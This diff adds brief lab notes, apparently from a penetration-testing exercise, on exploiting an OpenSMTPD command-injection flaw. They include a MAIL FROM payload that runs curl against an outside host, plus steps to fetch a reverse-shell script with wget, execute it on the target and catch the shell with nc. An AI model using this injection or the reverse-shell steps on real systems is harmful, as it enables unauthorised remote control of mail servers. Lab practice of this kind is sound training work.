@@ -1,0 +1,27 @@
+Use tcpdump to listen for ping
+sudo tcpdump -i tun0 icmp and src 192.168.194.71
+
+Use telnet to connect to smtp server
+
+-> telnet ip port
+
+HELO x
+MAIL FROM:<;curl 192.168.45.152/helloworld;>
+RCPT TO:<root>
+DATA
+.
+
+Use NMAP to scan target
+Use NMAP to scan specific ports/services, including OS and app versions
+
+OpenSMTP is the vulnerable application.  This vulnerability can be exploited using RCE and generating a reverse shell.
+
+1.  Connect to the client using telnet.
+
+2.  Start nc listening on port 80
+
+3.  Create a malicious payload using a shell script, which has the code that will establish a reverse shell.
+
+4.  Using the telnet client, exploit the vulnerability by adding the 'wget command' to download the malicious payloadto the target machine.
+
+4.  Using the telnet client, exploit the same vulnerability, this time executing the malicious code that was downloaded to the target
